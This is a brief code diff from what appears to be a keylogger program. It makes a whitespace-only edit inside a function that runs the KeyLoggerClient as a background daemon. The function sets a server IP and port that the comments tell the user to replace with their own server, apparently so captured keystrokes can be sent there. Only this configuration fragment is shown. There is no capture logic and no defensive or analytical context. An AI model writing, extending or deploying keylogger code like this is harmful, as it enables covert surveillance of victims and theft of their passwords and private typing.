@@ -128,7 +128,7 @@ class KeyLoggerClient:
 
 def run_in_background():
     """Run the KeyLogger as a background daemon."""
-    SERVER_IP = "127.0.0.1"  # Replace with your server IP
+    SERVER_IP = "127.0.0.1"        # Replace with your server IP
     SERVER_PORT = 9999             # Replace with your server port
 
     # Configure the daemon context
